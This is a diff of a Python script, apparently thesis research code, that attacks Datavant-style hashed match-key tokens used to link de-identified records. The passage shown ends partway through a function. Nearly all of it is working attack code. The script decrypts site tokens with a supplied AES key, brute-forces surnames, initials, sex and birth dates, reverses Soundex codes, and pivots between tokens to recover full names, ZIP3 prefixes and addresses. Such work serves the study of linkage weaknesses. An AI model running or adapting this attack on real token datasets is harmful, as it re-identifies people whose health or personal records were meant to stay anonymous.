@@ -1,4 +1,21 @@
 #!/usr/bin/env python3
+"""
+Master Thesis: Token Escalation Attack on Multi-Token PPRL Systems
+Author: Babett Müller
+Description:
+    This script implements a cryptanalytic framework to attack Datavant-like
+    match key tokens. It supports two primary modes:
+    1. Dictionary Mode: Uses reference datasets (frequency lists) to recover tokens.
+    2. Brute-Force Mode: Uses a recursive Soundex generator to reverse-engineer names.
+
+    The attack leverages a token "Escalation" (Pivoting), where information recovered
+    from low-entropy tokens (e.g., T1, T2) is used to reduce the search space for
+    high-entropy tokens (e.g., T4, T9).
+
+Dependencies:
+    - pandas, jellyfish, pycryptodome, gender-guesser
+"""
+
 import argparse
 import base64
 import csv
@@ -13,11 +30,11 @@ from Crypto.Cipher import AES
 import pandas as pd
 import time
 
-# =============================
-# Normalization / helpers
-# =============================
+# ==============================================================================
+# CONSTANTS & MAPPINGS
+# ==============================================================================
 
-# --- Maps for American Soundex (as used by jellyfish.soundex) ---
+# American Soundex Encoding Map
 AM_CODE_MAP = {
     b'b': '1', b'p': '1', b'f': '1', b'v': '1',
     b'c': '2', b's': '2', b'g': '2', b'j': '2', b'k': '2', b'q': '2', b'x': '2', b'z': '2',
@@ -26,6 +43,8 @@ AM_CODE_MAP = {
     b'm': '5', b'n': '5',
     b'r': '6',
 }
+
+# Inverse Map (Digit -> Possible Letters) for Generator
 AM_INV_CODE_MAP = {
     '1': [b'b', b'p', b'f', b'v'],
     '2': [b'c', b's', b'g', b'j', b'k', b'q', b'x', b'z'],
@@ -34,27 +53,61 @@ AM_INV_CODE_MAP = {
     '5': [b'm', b'n'],
     '6': [b'r'],
 }
+# Letters that are dropped in Soundex (unless initial)
 AM_ZERO_CODE_B = [b'a', b'e', b'i', b'o', b'u', b'y', b'h', b'w']
 # -----------------------------------------------------------------
 
+# Full Alphabet for Generator
 ALL_ALPHABET_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]
 
+# Global Counter for Hash Computations
 HASHES = 0
+
+# Token Separator
+SEP = b"|"
+
+# ==============================================================================
+# HELPER FUNCTIONS (NORMALIZATION & HASHING)
+# ==============================================================================
+
 def digest_and_count(h):
+    """
+    Finalizes the hash digest and increments the global hash counter.
+    Used to track computational cost of the attack.
+    """
     global HASHES
     HASHES += 1
     return h.digest()
 
+def to_bytes_list(xs):
+    """
+    Converts a list of strings to a list of normalized UTF-8 encoded byte strings,
+    filtering out empty or whitespace-only strings.
+    """
+    return [norm(x).encode("utf-8") for x in xs if str(x).strip()]
+
 def norm(s: Any) -> str:
+    """
+    Normalizes a string by removing non-alphanumeric characters, whitespace,
+    and converting to lowercase.
+    Example: "O'Connor" -> "oconnor"
+    """
     return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())
 
 def norm_gender(g: Any) -> str:
+    """
+    Standardizes gender/sex input to 'm', 'f', or 'u'.
+    """
     g = str(g or "").strip().lower()
     if g in ("m", "male"): return "m"
     if g in ("f", "female"): return "f"
     return "u"
 
 def norm_dob(s: Any) -> str:
+    """
+    Parses various date string formats and standardizes them to 'YYYYMMDD'.
+    Example: "1990-01-01" -> "19900101"
+    """
     s = str(s or "").strip()
     fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
     for f in fmts:
@@ -66,43 +119,37 @@ def norm_dob(s: Any) -> str:
         return s
     return ""
 
-def first_initial(fn: str) -> str:
-    n = norm(fn)
-    return n[0] if n else ""
-
 def first3(fn: str) -> str:
+    """
+    Extracts the first three characters from a first name.
+    """
     n = norm(fn)
     return n[:3] if n else ""
 
-def split_address(address, lang: str):
-    address = str(address).strip()
-    if not address: return ""
-    parts = address.split()
-    if lang == "de":
-        for i, part in enumerate(parts):
-            if part and part[0].isdigit():
-                street = " ".join(parts[:i]).strip().replace("-", "").replace(" ", "")
-                return street
-        return " ".join(parts).strip().replace("-", "").replace(" ", "")
-    elif lang == "us":
-        if parts and parts[0].isdigit():
-            street = " ".join(parts[1:]).strip().replace("-", "").replace(" ", "")
-        else:
-            street = " ".join(parts).strip().replace("-", "").replace(" ", "")
-        return street
-    return address.strip().replace("-", "").replace(" ", "")
-
 def split_address_b(address: str, lang: str) -> Tuple[bytes, bytes]:
+    """
+    Splits a raw address string into street name and house number.
+    Handles German (Street Number) and US (Number Street) formats differently.
+    
+    Returns:
+        (street_bytes, number_bytes)
+    """
     s = (address or "").strip()
     if not s: return b"", b""
+
+    # Clean and tokenize
     parts = s.replace("-", " ").split()
     chunks = ["".join(ch for ch in p.lower() if ch.isalnum()) for p in parts if p]
     if not chunks: return b"", b""
+
+    # US Format: "123 Main St" -> Number first
     if lang == "us":
         if chunks[0] and chunks[0][0].isdigit():
             number = chunks[0].encode()
             street = "".join(chunks[1:]).encode()
             return street, number
+        
+    # Default / German Format: "Hauptstrasse 123" -> Number last/middle
     num_idx = None
     for i, p in enumerate(chunks):
         if p and p[0].isdigit():
@@ -113,21 +160,31 @@ def split_address_b(address: str, lang: str) -> Tuple[bytes, bytes]:
     number = "".join(chunks[num_idx:]).encode()
     return street, number
 
-# =============================
-# Improve computation speed
-# =============================
-TOP_FIRST: list = []
-TOP_LAST: list = []
-TOP_ADDRESS: list = []
-SEX = ["m","f","u"]
-SEX_B = [b"m", b"f", b"u"]
-SEP = b"|"
-INITIALS_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]
+def make_init_hasher(master_salt: bytes | None):
+    """
+    Factory function that returns a hasher object.
+    - If salt is provided: Uses HMAC-SHA256.
+    - If salt is None: Uses SHA-256.
+    """
+    if master_salt is None:
+        def init_hasher(prefix=b""):
+            h = hashlib.sha256()
+            if prefix: h.update(prefix)
+            return h
+    else:
+        def init_hasher(prefix=b""):
+            return hmac.new(master_salt, prefix, hashlib.sha256)
+    return init_hasher
 
-def to_bytes_list(xs):
-    return [norm(x).encode("utf-8") for x in xs if str(x).strip()]
+# ==============================================================================
+# PRECOMPUTATION FUNCTIONS
+# ==============================================================================
 
 def precompute_dobs(min_year, max_year):
+    """
+    Generates a list of all valid dates (YYYYMMDD) within the given year range.
+    Optimization: Pre-encodes them to bytes to save time in the inner loop.
+    """
     dobs = []
     for y in range(min_year, max_year + 1):
         leap = (y % 4 == 0) and (y % 100 != 0 or y % 400 == 0)
@@ -137,7 +194,27 @@ def precompute_dobs(min_year, max_year):
                 dobs.append(f"{y:04d}{m:02d}{d:02d}".encode("utf-8"))
     return dobs
 
+def precompute_house_numbers(lang: str, max_de=500, max_us=500) -> list:
+    """
+    Generates a list of common house numbers to brute-force the address token (T9).
+    """
+    if lang == "de": return [f"{n}".encode("utf-8") for n in range(1, max_de+1)]
+    if lang == "us": return [f"{n}".encode("utf-8") for n in range(1, max_us+1)]
+    return []
+
 def build_soundex_maps(TOP_FIRST_B, TOP_LAST_B):
+    """
+    Constructs Reverse Lookup Maps (Indices) for the Dictionary Attack.
+    These maps allow O(1) retrieval of candidate names based on their derived features.
+    
+    Returns:
+        FN_BY_INITIAL: Map 'J' -> ['John', 'James'...]
+        FN_BY_SDX:     Map 'J500' -> ['John', 'Jon'...]
+        LN_BY_SDX:     Map 'S530' -> ['Smith', 'Smyth'...]
+        SDX_LAST:      Sorted list of unique Last Name Soundexes
+        SDX_FIRST:     Sorted list of unique First Name Soundexes
+        ... (byte versions)
+    """
     FN_BY_INITIAL = defaultdict(list)
     FN_BY_SDX     = defaultdict(list)
     LN_BY_SDX     = defaultdict(list)
@@ -164,31 +241,21 @@ def build_soundex_maps(TOP_FIRST_B, TOP_LAST_B):
     SDX_FIRST_B = [c.encode("utf-8") for c in SDX_FIRST]
     return FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B
 
-def make_init_hasher(master_salt: bytes | None):
-    if master_salt is None:
-        def init_hasher(prefix=b""):
-            h = hashlib.sha256()
-            if prefix: h.update(prefix)
-            return h
-    else:
-        def init_hasher(prefix=b""):
-            return hmac.new(master_salt, prefix, hashlib.sha256)
-    return init_hasher
-
-ZIP3_PARTS = [f"{z:03d}".encode("utf-8") for z in range(1000)]
-
-def precompute_house_numbers(lang: str, max_de=500, max_us=500):
-    if lang == "de": return [f"{n}".encode("utf-8") for n in range(1, max_de+1)]
-    if lang == "us": return [f"{n}".encode("utf-8") for n in range(1, max_us+1)]
-    return []
-
 def build_first3_map(first_names_b):
+    """
+    Builds a map for the T7 Pivot: First 3 Letters -> Full Names.
+    Example: b'mar' -> [b'mary', b'martin', b'mark'...]
+    """
     m = defaultdict(list)
     for fn in first_names_b:
         if fn: m[fn[:3]].append(fn)
     return m
 
 def precompute_all_soundex_codes() -> Tuple[Set[bytes], Set[bytes]]:
+    """
+    Generates the theoretical set of ALL valid American Soundex codes (Letter + 3 Digits).
+    Used for the Brute-Force Entry on T2 when no dictionary is available.
+    """
     initials = [bytes([c]) for c in range(ord('a'), ord('z') + 1)]
     digits = [bytes([c]) for c in b'123456']
     all_sdx_ln, all_sdx_fn = set(), set()
@@ -210,10 +277,19 @@ def precompute_all_soundex_codes() -> Tuple[Set[bytes], Set[bytes]]:
 
 def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[bytes]:
     """
-    (SMART GENERATOR - NO MEMOIZATION)
-    Generates all name strings (up to max_length) that match the
+    Recursive Generator (Brute-Force Engine).
+    
+    Reverses the Soundex algorithm to generate all possible name strings that map
+    to a given Soundex code. Generates all name strings (up to max_length) that match the
     American Soundex code. Only yields "complete" names.
     This version removes memoization to prevent memory crashes.
+    
+    Args:
+        soundex_code: Target code (e.g., "S530")
+        max_length: Maximum length of generated names.
+        
+    Yields:
+        Byte strings of candidate names (e.g., b"smith", b"smyth").
     """
     if not soundex_code or not soundex_code[0].isalpha() or len(soundex_code) != 4:
         return
@@ -233,6 +309,7 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
         # if state in memo: return       
         # memo.add(state)                
 
+        # 1. Suffix Mode: Digits matched, append arbitrary letters up to max_length
         if in_suffix_mode:
             yield current_name_b
         if len(current_name_b) >= max_length:
@@ -242,6 +319,8 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
                 if len(current_name_b) + len(char_b) <= max_length:
                     yield from _generate(current_name_b + char_b, None, "", 0, True)
             return
+        
+        # 2. Try appending vowels/separators (Zero Code)
         if consecutive_zeros < 2:
             for char_b in AM_ZERO_CODE_B:
                 if len(current_name_b) + len(char_b) <= max_length:
@@ -252,6 +331,8 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
                         consecutive_zeros + 1,
                         False
                     )
+
+        # 3. Try appending adjacent consonants (Same Code rule)
         if last_code_seen:
             for char_b in AM_INV_CODE_MAP.get(last_code_seen, []):
                  if len(current_name_b) + len(char_b) <= max_length:
@@ -262,6 +343,8 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
                         0, 
                         False
                     )
+
+        # 4. Try appending new consonants (Next Digit)
         next_digit_to_match = remaining_digits[0] if remaining_digits else None
         if next_digit_to_match:
             for char_b in AM_INV_CODE_MAP.get(next_digit_to_match, []):
@@ -275,6 +358,7 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
                             False
                         )
         else:
+            # Digits exhausted -> Switch to Suffix Mode
             if len(current_name_b) >= 1:
                 yield current_name_b
             for char_b in ALL_ALPHABET_B:
@@ -288,29 +372,15 @@ def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[b
                     )
     yield from _generate(initial_char_b, initial_code, digits_to_match, 0, False)
 
-# =============================
-# Master token functions
-# =============================
-def master_sha256(token_input: str) -> bytes:
-    h = hashlib.sha256()
-    h.update(token_input.encode("utf-8"))
-    return digest_and_count(h)
+# ==============================================================================
+# SITE DECRYPTION & LOADING
+# ==============================================================================
 
-def master_hmac(master_salt: bytes, token_input: str) -> bytes:
-    h = hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256)
-    return digest_and_count(h)
-
-def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
-    try: b = bytes.fromhex(s)
-    except ValueError: b = s.encode("utf-8")
-    if expect_len is not None and len(b) != expect_len:
-        raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
-    return b
-
-# =============================
-# Site encryption (AES)
-# =============================
 def aes128_ecb_decrypt_b64(site_key_16: bytes, token_b64: str) -> bytes:
+    """
+    Decrypts a base64-encoded AES-128-ECB encrypted token to retrieve the
+    intermediate master token hash.
+    """
     ct = base64.b64decode(token_b64)
     if len(ct) % 16 != 0: raise ValueError("Ciphertext not multiple of AES block size.")
     cipher = AES.new(site_key_16, AES.MODE_ECB)
@@ -318,22 +388,40 @@ def aes128_ecb_decrypt_b64(site_key_16: bytes, token_b64: str) -> bytes:
     return pt
 
 def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
+    """
+    Decrypts a Base64 encoded, AES-256-ECB encrypted site token to retrieve the
+    intermediate master token hash.
+    """
     ct = base64.b64decode(token_b64)
     if len(ct) % 16 != 0: raise ValueError("Ciphertext not multiple of AES block size.")
     cipher = AES.new(site_key_32, AES.MODE_ECB)
     pt = cipher.decrypt(ct)
     return pt
 
-# =============================
-# Load and decrypt site tokens
-# =============================
+def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
+    """
+    Helper to parse hex strings or UTF-8 strings into bytes.
+    """
+    try: b = bytes.fromhex(s)
+    except ValueError: b = s.encode("utf-8")
+    if expect_len is not None and len(b) != expect_len:
+        raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
+    return b
+
 def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
+    """
+    Reads the CSV file containing the encrypted tokens.
+    """
     with open(path, newline="", encoding="utf-8") as f:
         r = csv.DictReader(f)
         rows = list(r)
     return {"_RAW": rows}
 
 def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
+    """
+    Iterates through the raw CSV rows and decrypts all tokens for the target columns.
+    Returns a Set of unique Master Tokens (hashes) for each column type (T1, T2...).
+    """
     out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
     successes, failures = 0, 0
     for row in rows:
@@ -349,23 +437,50 @@ def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> 
         print(f"[decrypt] {c}: unique master tokens={len(out[c])} (successes={successes}, failures={failures})")
     return out
 
-# =============================
-# Attack core - Dictionary/Reference Based
-# =============================
+def master_sha256(token_input: str) -> bytes:
+    """
+    Computes SHA-256 hash of the input string and returns the digest.
+    """
+    h = hashlib.sha256()
+    h.update(token_input.encode("utf-8"))
+    return digest_and_count(h)
 
-today = date.today()
-min_age, max_age = 18, 80
-min_year, max_year = today.year - max_age, today.year - min_age
+def master_hmac(master_salt: bytes, token_input: str) -> bytes:
+    """
+    Computes HMAC-SHA256 of the input string using the provided master salt.
+    """
+    h = hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256)
+    return digest_and_count(h)
+
+# ==============================================================================
+# ATTACK FUNCTIONS (CORE LOGIC)
+# ==============================================================================
 
 def attack_T1_fast(master_tokens, lastnames_b, initials_b, dobs_b, init_hasher):
+    """
+    Entry Point Attack: T1 (Last Name + Initial + Sex + DOB).
+    Strategy:   Exhaustive Search (Dictionary * Calendar).
+    Complexity: O(Names * 26 * 3 * DOBs)
+    
+    Returns:
+        Map { master_token: (ln, fi, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
+
+    # Outer Loop: Last Names (Dictionary)
     for ln in lastnames_b:
         h_ln = init_hasher(ln + SEP)
+        
+        # Loop: First Initials (A-Z)
         for fi in initials_b:
             h_fi = h_ln.copy(); h_fi.update(fi + SEP)
+
+            # Loop: Sex (m/f/u)
             for g in SEX_B:
                 h_sig = h_fi.copy(); h_sig.update(g + SEP)
+
+                # Inner Loop: Date of Birth (Precomputed Bytes)
                 for dob in dobs_b:
                     h = h_sig.copy(); h.update(dob)
                     mt = digest_and_count(h)
@@ -374,9 +489,13 @@ def attack_T1_fast(master_tokens, lastnames_b, initials_b, dobs_b, init_hasher):
 
 def attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, init_hasher):
     """
-    (DICTIONARY-BASED)
-    Use LN_BY_SDX map to get candidate last names from the dictionary,
-    then test T1 candidates.
+    Pivot:      T1 <-- T2 (using known Soundex(LN) to get candidate last names from the dictionary
+    Strategy:   Use LN_BY_SDX map to get candidate last names from the dictionary,
+                then test T1 candidates.
+    Complexity: O(Candidates * 26)
+
+    Returns:
+        Map { master_token: (ln, fi, sex, dob) }
     """
     hits = {}
     contains = master_tokens.__contains__
@@ -400,6 +519,14 @@ def attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, i
     return hits
 
 def attack_T2_fast(master_tokens, use_sdx_last_b, use_sdx_first_b, dobs_b, init_hasher):
+    """
+    Entry Point Attack: T2 (Soundex(LN) + Soundex(FN) + Sex + DOB).
+    Strategy: Combinatorial Search of Soundex Codes.
+    Complexity: O(Soundex_LN * Soundex_FN * 3 * DOBs)
+
+    Returns:
+        Map { master_token: (sdx_ln, sdx_fn, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     for sdx_ln in use_sdx_last_b:
@@ -415,6 +542,14 @@ def attack_T2_fast(master_tokens, use_sdx_last_b, use_sdx_first_b, dobs_b, init_
     return hits
 
 def attack_T2_via_T1(master_tokens, SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher):
+    """
+    Pivot:      T2 <-- T1 (using known Last Name to get Soundex(LN))
+    Strategy:   Soundex First Name Candidates from Initial + Known Soundex(LN)
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (sdx_ln, sdx_fn, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     sdx_ln = last_to_sdx.get(ln_b)
@@ -437,6 +572,15 @@ def attack_T2_via_T1(master_tokens, SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_s
     return hits
 
 def attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher):
+    """
+    Pivot:      T7 --> T1 (using known Last Name + First Initial to brute-force
+                the first three letters of the first name).
+    Strategy:   Brute-Force First 3 Letters of First Name.
+    Complexity: O(26 * 26)
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     if not fi_b or len(fi_b) != 1: return hits
@@ -452,26 +596,16 @@ def attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher):
             if contains(mt): hits[mt] = (ln_b, fi3_b, g_b, dob_b)
     return hits
 
-def attack_T7_via_T2_T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher):
-    hits = {}
-    contains = master_tokens.__contains__
-    try: sdx_fn_str = sdx_fn_b.decode("utf-8")
-    except: return hits
-    cand_first_names = FN_BY_SDX.get(sdx_fn_str, [])
-    if not cand_first_names: return hits
-    h_ln = init_hasher(ln_b + SEP)
-    fi3_candidates = set(fn_b[:3] for fn_b in cand_first_names if fn_b)
-    if not fi3_candidates: return hits
-    for fi3_b in fi3_candidates:
-        if not fi3_b: continue
-        h_fi3 = h_ln.copy(); h_fi3.update(fi3_b + SEP)
-        h_sig = h_fi3.copy(); h_sig.update(g_b + SEP)
-        h_final = h_sig.copy(); h_final.update(dob_b)
-        mt = digest_and_count(h_final)
-        if contains(mt): hits[mt] = (ln_b, fi3_b, g_b, dob_b)
-    return hits
-
 def attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
+    """
+    Pivot:      T7 --> T2 (using known Soundex(LN) + Soundex(FN) to lookup
+                candidate last names and first names, then extract first 3 letters of first names).
+    Strategy:   Lookup candidate names from Soundex maps and extract first 3 letters.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     try:
@@ -495,7 +629,45 @@ def attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, F
             if contains(mt): hits[mt] = (ln_b, fi3_b, g_b, dob_b)
     return hits
 
+def attack_T7_via_T2_T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher):
+    """
+    Pivot:      T7 --> T2 --> T1 (using known Last Name to brute-force
+                the first three letters of first name from Soundex(FN) map).
+    Strategy:   Lookup candidate first names from Soundex(FN) map and extract first 3 letters.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
+    hits = {}
+    contains = master_tokens.__contains__
+    try: sdx_fn_str = sdx_fn_b.decode("utf-8")
+    except: return hits
+    cand_first_names = FN_BY_SDX.get(sdx_fn_str, [])
+    if not cand_first_names: return hits
+    h_ln = init_hasher(ln_b + SEP)
+    fi3_candidates = set(fn_b[:3] for fn_b in cand_first_names if fn_b)
+    if not fi3_candidates: return hits
+    for fi3_b in fi3_candidates:
+        if not fi3_b: continue
+        h_fi3 = h_ln.copy(); h_fi3.update(fi3_b + SEP)
+        h_sig = h_fi3.copy(); h_sig.update(g_b + SEP)
+        h_final = h_sig.copy(); h_final.update(dob_b)
+        mt = digest_and_count(h_final)
+        if contains(mt): hits[mt] = (ln_b, fi3_b, g_b, dob_b)
+    return hits
+
 def pivot_to_T4_fast(master_tokens, FN_BY_INITIAL, FN_BY_SDX, t1_hit, t2_hit, init_hasher):
+    """
+    Pivot:      T4 <-- T1 (+ T2) (using known Last Name + First Initial to get candidate first names from dictionary,
+                optionally filtered by Soundex(FN) from T2).
+    Strategy:   Use FN_BY_INITIAL map to get candidate first names from the dictionary,
+                optionally filtered by Soundex(FN) from T2, then test T4 candidates.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (ln, fn, sex, dob) }
+    """
     ln_b, fi_b, g_b, dob_b = t1_hit
     contains = master_tokens.__contains__
     cand_fns = FN_BY_INITIAL.get(fi_b[:1], [])
@@ -519,6 +691,15 @@ def pivot_to_T4_fast(master_tokens, FN_BY_INITIAL, FN_BY_SDX, t1_hit, t2_hit, in
     return hits
 
 def pivot_to_T4_via_T7(master_tokens, ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_hasher):
+    """
+    Pivot:      T4 <-- T7 (using known Last Name + First 3 letters of First Name to get candidate first names from dictionary).
+    Strategy:   Use FIRST3_MAP to get candidate first names from the dictionary,
+                then test T4 candidates.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (ln, fn, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     prefix = fi3_b[:3]
@@ -534,6 +715,16 @@ def pivot_to_T4_via_T7(master_tokens, ln_b, fi3_b, g_b, dob_b, FIRST3_MAP, init_
     return hits
 
 def pivot_to_T4_via_T7_T2(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
+    """
+    Pivot:      T4 <-- T7 (+ T2) (using known Last Name + First 3 letters of First Name to get candidate first names from dictionary,
+                optionally filtered by Soundex(LN) and Soundex(FN) from T2).
+    Strategy:   Use LN_BY_SDX and FN_BY_SDX maps to get candidate last names and first names from the dictionary,
+                optionally filtered by Soundex(LN) and Soundex(FN) from T2, then test T4 candidates.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (ln, fn, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     try:
@@ -555,6 +746,15 @@ def pivot_to_T4_via_T7_T2(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, 
     return hits
 
 def attack_T4(master_tokens, lastnames_b, firstnames_b, dobs_b, init_hasher):
+    """
+    Pivot:      T4 <-- T1 (using known Last Name + First Name + DOB to get candidate records).
+    Strategy:   Use lastnames_b, firstnames_b, and dobs_b to generate candidate records,
+                then test T4 candidates.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (ln, fn, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     for ln in lastnames_b:
@@ -570,6 +770,15 @@ def attack_T4(master_tokens, lastnames_b, firstnames_b, dobs_b, init_hasher):
     return hits
 
 def pivot_to_T3_fast(master_tokens, ln_b, fn_b, dob_b, init_hasher):
+    """
+    Pivot:      T3 <-- T4 (using known Last Name + First Name + DOB to get candidate ZIP3 parts).
+    Strategy:   Use known Last Name, First Name, and DOB to generate candidate ZIP3 parts,
+                then test T3 candidates.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (ln, fn, dob, zip3) }
+    """
     contains = master_tokens.__contains__
     h0 = init_hasher(ln_b + SEP + fn_b + SEP + dob_b + SEP)
     hits = {}
@@ -580,6 +789,15 @@ def pivot_to_T3_fast(master_tokens, ln_b, fn_b, dob_b, init_hasher):
     return hits
 
 def pivot_to_T9_fast(master_tokens, fn_b, address_list_raw, lang, exclude_house_numbers, HOUSE_NUMBERS, init_hasher):
+    """
+    Pivot:      T9 <-- T4 (using known First Name to get candidate addresses).
+    Strategy:   Use known First Name and address list to generate candidate addresses,
+                then test T9 candidates.
+    Complexity: O(Candidates)
+
+    Returns:
+        Map { master_token: (fn, address) }
+    """
     contains = master_tokens.__contains__
     fn_prefix = init_hasher(fn_b + SEP)
     hits = {}
@@ -613,7 +831,14 @@ def pivot_to_T9_fast(master_tokens, fn_b, address_list_raw, lang, exclude_house_
 # =============================
 
 def attack_T1_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_LN_LEN, init_hasher, max_preimages: int) -> Dict[bytes, tuple]:
-    """Generate T1 candidates from a T2 preimage with an upper bound on LN preimages."""
+    """
+    Pivot:      T1 <-- T2 using generator, with max_preimages cap for LNs.
+    Strategy:   Generate all possible last names matching Soundex(LN) using generator,
+                then test T1 candidates.
+
+    Returns:
+        Map { master_token: (ln, fi, sex, dob) }
+    """
     t1_hits = {}
     contains = master_tokens.__contains__
     try:
@@ -647,7 +872,14 @@ def attack_T1_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MA
     return t1_hits
 
 def attack_T7_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_LN_LEN, init_hasher, max_preimages: int):
-    """(GENERATOR) Recover T7 from T2 using generator, with max_preimages cap for LNs."""
+    """
+    Pivot:      T7 <-- T2 using generator, with max_preimages cap for LNs.
+    Strategy:   Generate all possible last names matching Soundex(LN) using generator,
+                then test T7 candidates.
+
+    Returns:
+        Map { master_token: (ln, fi3, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     try:
@@ -686,6 +918,14 @@ def attack_T7_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MA
     return hits
 
 def pivot_to_T4_via_T1_T2_generator(master_tokens, t1_preimage, t2_preimage, MAX_FN_LEN, init_hasher, max_preimages: int):
+    """
+    Pivot:      T4 <-- T1, T2 using generator, with max_preimages cap for FNs.
+    Strategy:   Generate all possible first names matching Soundex(FN) using generator,
+                then test T4 candidates.
+
+    Returns:
+        Map { master_token: (ln, fn, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     (ln_b, fi_b, g_b, dob_b) = t1_preimage
@@ -713,6 +953,14 @@ def pivot_to_T4_via_T1_T2_generator(master_tokens, t1_preimage, t2_preimage, MAX
     return hits
 
 def pivot_to_T4_via_T7_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, MAX_FN_LEN, MAX_LN_LEN, init_hasher, max_preimages: int):
+    """
+    Pivot:      T4 <-- T7, T2 using generator, with max_preimages cap for FNs and LNs.
+    Strategy:   Generate all possible first and last names matching Soundex(FN) and Soundex(LN) using generator,
+                match first 3 letters of first names, then test T4 candidates.
+
+    Returns:
+        Map { master_token: (ln, fn, sex, dob) }
+    """
     hits = {}
     contains = master_tokens.__contains__
     try:
@@ -758,6 +1006,9 @@ def pivot_to_T4_via_T7_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_
 # =============================
 
 def attack_T1_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_FN_LEN, MAX_LN_LEN, init_hasher, max_preimages: int):
+    """
+    Pure brute force wrapper for attack_T1_via_T2_generator.
+    """
     hits_with_context = {}
     t1_hits = attack_T1_via_T2_generator(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_LN_LEN, init_hasher, max_preimages)
     t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
@@ -766,6 +1017,9 @@ def attack_T1_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_FN_
     return hits_with_context
 
 def attack_T7_via_T1_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
+    """
+    Pure brute force wrapper for attack_T7_via_T1.
+    """
     hits_with_context = {}
     (ln_b, fi_b, g_b, dob_b) = t1_preimage
     t7_hits = attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher) 
@@ -774,6 +1028,9 @@ def attack_T7_via_T1_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
     return hits_with_context
 
 def attack_T7_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, MAX_FN_LEN, MAX_LN_LEN, init_hasher, max_preimages: int):
+    """
+    Pure brute force wrapper for attack_T7_via_T2_generator.
+    """
     hits_with_context = {}
